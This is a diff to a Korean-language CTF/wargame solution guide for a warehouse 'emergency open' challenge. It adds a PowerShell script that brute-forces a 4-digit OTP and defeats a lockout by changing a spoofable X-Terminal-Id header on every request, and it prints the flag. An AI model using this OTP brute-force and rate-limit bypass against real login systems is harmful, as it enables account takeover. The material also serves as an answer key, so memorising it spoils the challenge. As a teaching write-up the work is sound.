@@ -76,18 +76,21 @@
 
 ## 4장 · 05 (중) — 창고 긴급 개방 시스템
 
-**풀이 흐름:** 공개된 계정(`headroaster` / `roast2026`)으로 로그인합니다 → "창고 긴급 개방"에 4자리 보안 코드가 추가로 필요한 것을 확인합니다 → 몇 번을 틀려도 막히지 않는 것을 확인하고, 0000-9999를 자동으로 전부 시도하는 스크립트를 돌립니다 → 맞는 코드로 플래그를 확인합니다.
+**풀이 흐름:** 공개된 계정(`headroaster` / `roast2026`)으로 로그인합니다 → "창고 긴급 개방"에 4자리 보안 코드가 추가로 필요한 것을 확인합니다 → 코드를 5번 틀려 "단말기 잠김"이 뜨는 것을 확인합니다 → 잠금 안내문에서 `X-Terminal-Id` 헤더로 단말기를 구분한다는 것을 알아냅니다 → 요청마다 이 헤더 값을 다르게 보내 잠금을 무력화하면서 0000-9999를 자동으로 전부 시도하는 스크립트를 돌립니다 → 맞는 코드로 플래그를 확인합니다.
+
+**화면 힌트:** 5번 틀리면 뜨는 "단말기 잠김" 화면에 "단말기(`X-Terminal-Id: 기본`)에서 시도 횟수를 초과했습니다. 다른 입구 단말기에서 시도하십시오"라고 적혀 있습니다. 여기서 단말기 구분이 `X-Terminal-Id`라는 요청 헤더 값으로 이루어진다는 것, 그리고 "다른 단말기에서 시도하라"는 말 자체가 이 헤더 값을 클라이언트가 바꿔 보낼 수 있다는 걸 암시합니다.
 
 **실행:**
 1. `https://kload-wargame.onrender.com/ch4/05/`에서 `headroaster` / `roast2026`으로 로그인합니다. "보안 코드 확인" 화면으로 이동합니다.
-2. 아무 코드나 입력해 "확인"을 눌러 보고, 틀려도 잠기거나 막히지 않는 것을 확인합니다.
-3. PowerShell에서 아래 스크립트를 실행해 0000부터 9999까지 코드를 자동으로 전부 시도합니다.
+2. 아무 코드나 5번 입력해 "확인"을 눌러 보면, "단말기 잠김" 화면과 함께 `X-Terminal-Id` 헤더 이름이 드러납니다.
+3. PowerShell에서 아래 스크립트를 실행합니다. 요청마다 `X-Terminal-Id` 값을 매번 다르게 보내서(예: `gate-0`, `gate-1`, ...) 단말기 잠금을 피하면서 0000부터 9999까지 코드를 자동으로 전부 시도합니다.
    ```
    $session = $null
    Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch4/05/login" -Method POST -Body @{id="headroaster"; pw="roast2026"} -SessionVariable session -UseBasicParsing | Out-Null
    for ($i = 0; $i -le 9999; $i++) {
        $code = $i.ToString("0000")
-       $resp = Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch4/05/verify-code" -Method POST -Body @{code=$code} -WebSession $session -UseBasicParsing
+       $headers = @{ "X-Terminal-Id" = "gate-$i" }
+       $resp = Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch4/05/verify-code" -Method POST -Body @{code=$code} -Headers $headers -WebSession $session -UseBasicParsing
        if ($resp.Content -match "BREW\{[^}]*\}") {
            Write-Host "맞는 코드: $code"
            Write-Host $matches[0]
@@ -99,7 +102,7 @@
 
 **플래그:** `BREW{ch4_05_otp_bruteforce}`
 
-**취약점:** 2단계 인증 코드가 4자리(0000-9999, 1만 가지)뿐이고, 틀린 시도 횟수를 서버가 전혀 세거나 제한하지 않습니다. 코드 공간이 좁고 잠금 장치도 없으니, 자동화 스크립트로 전부 시도하면 반드시 뚫립니다 (2단계 인증 자체가 있다고 안전한 것이 아니라, 그 값 공간과 시도 횟수 제한까지 갖춰야 의미가 있다는 사례).
+**취약점:** 2단계 인증 코드가 4자리(0000-9999, 1만 가지)뿐이고, 같은 단말기로 5번 틀리면 잠그는 시도 횟수 제한이 걸려 있습니다. 하지만 "어느 단말기인지"를 서버가 클라이언트가 보낸 `X-Terminal-Id` 헤더 값만 보고 판단하고 따로 검증하지 않습니다. 그래서 요청마다 이 헤더 값을 바꿔 보내면 매번 "새 단말기"로 취급되어 잠금이 걸리지 않고, 결국 코드 공간 전체를 제한 없이 시도할 수 있습니다 (잠금 장치가 있어도, 그 장치가 클라이언트가 조작 가능한 값에 의존하면 무력화될 수 있다는 사례 — Rate Limit Bypass via spoofable header).
 
 ## 4장 · 06 (중) — 배전반 로그아웃
 
